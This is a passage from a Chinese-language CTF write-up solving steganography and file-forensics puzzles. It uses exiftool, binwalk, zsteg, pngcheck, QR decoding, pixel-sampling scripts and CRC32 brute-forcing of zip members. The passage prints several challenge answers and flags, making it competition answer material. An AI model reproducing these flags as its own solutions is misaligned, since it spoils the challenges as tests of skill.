class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">3</span>):</span><br><span class="line">  flag+=chr(int(steady_str[i:i+<span class="number">3</span>],<span class="number">8</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="闪的好快"><a href="#闪的好快" class="headerlink" title="闪的好快"></a>闪的好快</h3><p>使用kali或者python分离图片。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# convert &#39;flag.gif&#39;  flag.png</span><br></pre></td></tr></table></figure><p>然后使用kali工具批量扫描二维码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;flag$ for i in &#123;0..17&#125;;do zbarimg &quot;.&#x2F;flag-$i.png&quot;;done &gt;&gt; qr.txt</span><br></pre></td></tr></table></figure><p>拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">QR-Code:S</span><br><span class="line">QR-Code:Y</span><br><span class="line">QR-Code:C</span><br><span class="line">QR-Code:&#123;</span><br><span class="line">QR-Code:F</span><br><span class="line">QR-Code:<span class="number">1</span></span><br><span class="line">QR-Code:a</span><br><span class="line">QR-Code:S</span><br><span class="line">QR-Code:h</span><br><span class="line">QR-Code:_</span><br><span class="line">QR-Code:s</span><br><span class="line">QR-Code:o</span><br><span class="line">QR-Code:_</span><br><span class="line">QR-Code:f</span><br><span class="line">QR-Code:<span class="number">4</span></span><br><span class="line">QR-Code:s</span><br><span class="line">QR-Code:T</span><br><span class="line">QR-Code:&#125;</span><br></pre></td></tr></table></figure><h1 id="中国移动"><a href="#中国移动" class="headerlink" title="中国移动"></a>中国移动</h1><h2 id="杂项-2"><a href="#杂项-2" class="headerlink" title="杂项"></a>杂项</h2><h3 id="FRP06-Where"><a href="#FRP06-Where" class="headerlink" title="FRP06 Where"></a>FRP06 Where</h3><p>拿到一个jpg文件。</p><p>linux下使用exiftool分析，发现是个gif文件，打开winhex发现也是gif头。直接修改后缀。我们可以看到名字虽然是jpg，但是类型却是gif。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面$ exiftool /home/steady/桌面/<span class="keyword">where</span>.jpg</span><br><span class="line">ExifTool Version Number         : <span class="number">12.07</span></span><br><span class="line">File Name                       : <span class="keyword">where</span>.jpg</span><br><span class="line">Directory                       : /home/steady/桌面</span><br><span class="line">File Size                       : <span class="number">392</span> kB</span><br><span class="line">File Modification Date/Time     : <span class="number">2020</span>:<span class="number">03</span>:<span class="number">09</span> <span class="number">20</span>:<span class="number">25</span>:<span class="number">57</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access Date/Time           : <span class="number">2020</span>:<span class="number">10</span>:<span class="number">27</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">58</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change Date/Time     : <span class="number">2020</span>:<span class="number">10</span>:<span class="number">27</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">58</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : <span class="number">89</span>a</span><br><span class="line">Image Width                     : <span class="number">640</span></span><br><span class="line">Image Height                    : <span class="number">441</span></span><br><span class="line">Has Color Map                   : Yes</span><br><span class="line">Color Resolution Depth          : <span class="number">8</span></span><br><span class="line">Bits Per Pixel                  : <span class="number">8</span></span><br><span class="line">Background Color                : <span class="number">255</span></span><br><span class="line">XMP Toolkit                     : Adobe XMP Core <span class="number">5.3</span>-c011 <span class="number">66.145661</span>, <span class="number">2012</span>/<span class="number">02</span>/<span class="number">06</span><span class="number">-14</span>:<span class="number">56</span>:<span class="number">27</span></span><br><span class="line">Creator Tool                    : <span class="function">Adobe Photoshop <span class="title">CS6</span> (<span class="params">Windows</span>)</span></span><br><span class="line"><span class="function">Instance ID                     : xmp.iid:20FECB3F620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Document ID                     : xmp.did:20FECB40620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Derived From Instance ID        : xmp.iid:20FECB3D620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Derived From Document ID        : xmp.did:20FECB3E620111EAAC58D00140743BB9</span></span><br><span class="line"><span class="function">Frame Count                     : 3</span></span><br><span class="line"><span class="function">Duration                        : 10.10 s</span></span><br><span class="line"><span class="function">Image Size                      : 640x441</span></span><br><span class="line"><span class="function">Megapixels                      : 0.282</span></span><br></pre></td></tr></table></figure><p>直接查看gif文件或者使用linux–convert分离gif，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# convert &#39;&#x2F;root&#x2F;桌面&#x2F;where.gif&#39; flag.png</span><br></pre></td></tr></table></figure><p>win的软件也可以直接分帧拿到flag。</p><h3 id="FRP10-hekkerman"><a href="#FRP10-hekkerman" class="headerlink" title="FRP10 hekkerman"></a>FRP10 hekkerman</h3><p>拿到图片，binwalk分析，直接提取文件，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ binwalk -e &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, little-endian offset of first image directory: 8</span><br><span class="line">212           0xD4            JPEG image data, JFIF standard 1.01</span><br><span class="line">242           0xF2            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">414           0x19E           JPEG image data, JFIF standard 1.01</span><br><span class="line">444           0x1BC           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">28428         0x6F0C          Copyright string: &quot;Copyright International Color Consortium, 2009&quot;</span><br></pre></td></tr></table></figure><p>dd命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ dd if&#x3D;00000000.jpg of&#x3D;flag-1.jpg skip&#x3D;414 bs&#x3D;1</span><br></pre></td></tr></table></figure><p>exiftool提取缩略图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ exiftool -b -ThumbnailImage &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg&gt; thumbnail.jpg </span><br></pre></td></tr></table></figure><p>python读出文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">414</span></span><br><span class="line">f1=open(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f=open(<span class="string">&quot;hekkerman.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">f.read(offset)</span><br><span class="line">data = f.read()</span><br><span class="line">f1.write(data)</span><br></pre></td></tr></table></figure><h3 id="FRP04-Fat-Cat"><a href="#FRP04-Fat-Cat" class="headerlink" title="FRP04 Fat Cat"></a>FRP04 Fat Cat</h3><p>修改jpg宽度，搜索十六进制FFC0之后的第三个到第七个十六进制是图片的宽度和高度。修改之后拿到flag。</p><h3 id="Misc4-Burps"><a href="#Misc4-Burps" class="headerlink" title="Misc4-Burps"></a>Misc4-Burps</h3><p>CRC32碰撞</p><p>将<code>1.txt-6.txt</code>的冗余校验码提取出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.txt 0x6083a1c8 </span><br><span class="line">2.txt 0xce70d424</span><br><span class="line">3.txt 0xc3f17511</span><br><span class="line">4.txt 0x526fd582</span><br><span class="line">5.txt 0x30e25038</span><br><span class="line">6.txt 0xaa3e6aea</span><br></pre></td></tr></table></figure><p>然后使用脚本碰撞，观察每一次得到的<code>4 bytes</code>，每一次得到4块十六进制数，将十六进制转换为字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Tools\Misc\crc32&gt; python .\crc32.py reverse 0x6083a1c8</span><br><span class="line">4 bytes: &#123;0x74, 0x68, 0x65, 0x5f&#125;</span><br><span class="line">verification checksum: 0x6083a1c8 (OK)</span><br><span class="line">alternative: Cb9fTf (OK)</span><br><span class="line">alternative: Jhn4CW (OK)</span><br><span class="line">alternative: K9Md4R (OK)</span><br><span class="line">alternative: Lmggsq (OK)</span><br><span class="line">alternative: Nls5B4 (OK)</span><br><span class="line">alternative: PNHKc5 (OK)</span><br><span class="line">alternative: TJUJbV (OK)</span><br><span class="line">alternative: X4bYjM (OK)</span><br><span class="line">alternative: apQQ_2 (OK)</span><br><span class="line">alternative: bmKntz (OK)</span><br><span class="line">alternative: e9am3Y (OK)</span><br><span class="line">alternative: tEfsYS (OK)</span><br><span class="line">alternative: v4NPmF (OK)</span><br></pre></td></tr></table></figure><p>十六进制转字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;&quot;7468655f&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,len(steady_str),2):</span><br><span class="line">    flag+&#x3D;chr(int(steady_str[i:i+2],16))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="Misc5-Trees"><a href="#Misc5-Trees" class="headerlink" title="Misc5-Trees"></a>Misc5-Trees</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>,(w//<span class="number">16</span>,h//<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(w//<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(h//<span class="number">16</span>):</span><br><span class="line">        (r,g,b)=img.getpixel((x*<span class="number">16</span>,y*<span class="number">16</span>))</span><br><span class="line">        img_obj.putpixel((x,y),(r,g,b))</span><br><span class="line"></span><br><span class="line">img_obj.save(<span class="string">&#x27;ok.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="FRP19-Sunset"><a href="#FRP19-Sunset" class="headerlink" title="FRP19 Sunset"></a>FRP19 Sunset</h3><p>这道题尝试很多方式都没有拿到flag。最后仔细看图片，发现图片中有些小黑点，小黑点组成flag。一开始尝试stegsolve，找到白色比较多的一张图片，使用画图工具进行反色，但是情况并不理想，只能看到flag字段。</p><p>后来尝试python脚本，一开始的想法是找到对应的小黑点的rgb，然后根据rgb找到对应的坐标，然后把rgb值写入找到的对应坐标，然后根据坐标在画图。后来发现rgb的值不稳定，取出来的坐标也不全，这里写一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">if</span> list(img.getpixel((i, j)))==list((<span class="number">34</span>, <span class="number">76</span>, <span class="number">118</span>)):</span><br><span class="line">            print(i,j)</span><br></pre></td></tr></table></figure><p>最后想到直接取出对应坐标的rgb值，然后放到对应坐标就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img=Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">w,h=img.size</span><br><span class="line">dec=Image.new(<span class="string">&#x27;RGB&#x27;</span>,(int(w/<span class="number">16</span>),int(h/<span class="number">16</span>)))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(int(w/<span class="number">16</span>)):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(int(h/<span class="number">16</span>)):</span><br><span class="line">dec.putpixel((x,y),img.getpixel((x*<span class="number">16</span>,y*<span class="number">16</span>)))</span><br><span class="line">dec.show()</span><br></pre></td></tr></table></figure><p>答题意思就是生成一个全新的图片，但是大小像素缩小到原来的十六倍。获取到对应坐标的rgb值，直接就粘贴到新的图片，这里为什么是十六的倍数？</p><p>打开画图看到，整张图片被分成了许多正方形的小块，而flag的部分，在正方向的左上角，每个正方形的长度是8。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/27.png" alt="27"></p><p>把倍数改成8也是可以得到flag。</p><h3 id="FRP07-Hide"><a href="#FRP07-Hide" class="headerlink" title="FRP07 Hide"></a>FRP07 Hide</h3><p>听说是lsb隐写，使用stegsolve进行data extract，没有发现什么东西。直接使用zsteg，并使用–all参数，拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag/套娃<span class="comment"># zsteg &#x27;/root/桌面/flag/hide.png&#x27; --al | grep &quot;flag&quot;</span></span><br><span class="line">b1,g,lsb,yx         .. text: <span class="string">&quot;flag&#123;easy_LSB_stego&#125;v5&quot;</span></span><br></pre></td></tr></table></figure><h3 id="FRP05-Chain"><a href="#FRP05-Chain" class="headerlink" title="FRP05 Chain"></a>FRP05 Chain</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg&#x2F;chain.jpg</span><br></pre></td></tr></table></figure><p>拿到flag的十六进制，转为字符串就是flag。</p><h3 id="FRP15-Checkit"><a href="#FRP15-Checkit" class="headerlink" title="FRP15 Checkit"></a>FRP15 Checkit</h3><p>题目是checkit，图片也是png。尝试pngcheck。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop\CTFTools\信息隐藏\pngcheck&gt;pngcheck.exe -v C:\Users\12521\Desktop\check.png</span><br><span class="line">File: C:\Users\12521\Desktop\check.png (1421461 bytes)</span><br><span class="line">  chunk IHDR at offset 0x0000c, length 13</span><br><span class="line">    1000 x 562 image, 32-bit RGB+alpha, non-interlaced</span><br><span class="line">  chunk sRGB at offset 0x00025, length 1</span><br><span class="line">    rendering intent &#x3D; perceptual</span><br><span class="line">  chunk gAMA at offset 0x00032, length 4: 0.45455</span><br><span class="line">  chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels&#x2F;meter (96 dpi)</span><br><span class="line">  chunk IDAT at offset 0x00057, length 65445</span><br><span class="line">    zlib: deflated, 32K window, fast compression</span><br><span class="line">  chunk IDAT at offset 0x10008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x20008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x30008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x40008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x50008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x60008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x70008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x80008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x90008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xa0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xb0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xc0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xd0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xe0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0xf0008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x100008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x110008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x120008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x130008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x140008, length 65524</span><br><span class="line">  chunk IDAT at offset 0x150008, length 45027</span><br><span class="line">  chunk IDAT at offset 0x15aff7, length 138</span><br><span class="line">  chunk IEND at offset 0x15b08d, length 0</span><br></pre></td></tr></table></figure><p>倒数第三个块没有满，倒数第二个块就是隐藏的数据。</p><p>提取出来，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib </span><br><span class="line"><span class="keyword">import</span> binascii </span><br><span class="line">a=<span class="string">&quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>) </span><br><span class="line">b=zlib.decompress(a) </span><br><span class="line">result=binascii.hexlify(b) </span><br><span class="line">print(result)</span><br><span class="line">print(bin(int(result,<span class="number">16</span>)))</span><br></pre></td></tr></table></figure><p>二进制转化为图片，扫码拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">25</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX*<span class="number">9</span>,MAX*<span class="number">9</span>))</span><br><span class="line">str = <span class="string">&quotquot;</span></span><br><span class="line">print(len(str))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX*<span class="number">9</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX*<span class="number">9</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                    pic.putpixel([x+j,y+n],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                    pic.putpixel([x+l,y+k],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="FRP18-loli"><a href="#FRP18-loli" class="headerlink" title="FRP18 loli"></a>FRP18 loli</h3><p>拿到类似二维码的图片尝试扫描。得到提示：</p><p><code>tips:255</code>。最后通过将图片转16进制和0xff异或，也就是将图片的16进制取反。使用winhex的异或功能。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/33.png" alt="33"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/34.png" alt="34"></p><p>最后拿到一张图片，图片中藏有一个png，并且图片最后有提示–<code>black and wihite</code>。</p><p>拿到图片之后是一些黑白组成的，当然考虑白1黑0进行转换，仔细观察发现一共被分成了11列，每一列都被白色分隔开，并且被分割成了50行，每一行都被黑色分割开。而且还发现每一列都是八个黑白色组成。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line">color=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">            pixel = img.getpixel((<span class="number">9</span>*j + z, i))</span><br><span class="line">            <span class="keyword">if</span> pixel == (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">                color += <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                color += <span class="string">&quot;0&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(color),<span class="number">8</span>):</span><br><span class="line">    flag+=chr(int(color[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>ais2{<del>Black_n_White_vi5ual_crYPtoGraPhY</del>}</p><h3 id="FRP09-Childhood-memories"><a href="#FRP09-Childhood-memories" class="headerlink" title="FRP09 Childhood memories"></a>FRP09 Childhood memories</h3><p>拿到一个txt文件，文件首行begin 664 quiz。改为后缀rar，解压再次改为rar，拿到两张图片。使用Bcompare拿到flag。</p><h3 id="CMP05-Not-long-enough"><a href="#CMP05-Not-long-enough" class="headerlink" title="CMP05 Not long enough"></a>CMP05 Not long enough</h3><p>一看就是CRC爆破，一开始使用好压压缩，每个文件为1kb，所以索性爆出1kb，但是没有爆出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=string.printable</span><br><span class="line">f = zipfile.ZipFile(<span class="string">&quot;1.zip&quot;</span>)</span><br><span class="line">l = f.namelist()</span><br><span class="line">info=f.infolist()</span><br><span class="line">list_crc=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    GetCrc = f.getinfo(i)</span><br><span class="line">    crc = GetCrc.CRC</span><br><span class="line">    list_crc.append(hex(crc))</span><br><span class="line">print(list_crc[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_crc:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> a1 <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> a2 <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">for</span> a3 <span class="keyword">in</span> s:</span><br><span class="line">                    <span class="keyword">for</span> a4 <span class="keyword">in</span> s:</span><br><span class="line">                        <span class="keyword">for</span> a5 <span class="keyword">in</span> s:</span><br><span class="line">                            flag=j+a1+a2+a3+a4+a5</span><br><span class="line">                            <span class="keyword">if</span> crc==(binascii.crc32(flag.encode())&amp;<span class="number">0xffffffff</span>):</span><br><span class="line">                                print(flag)</span><br></pre></td></tr></table></figure><p>但是发现爆破太慢了尝试工具。爆破六位crc使用以下工具：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">12521</span>\Desktop\CTF脚本\杂项\压缩包\crc32-master&gt;python3 crc32.py reverse <span 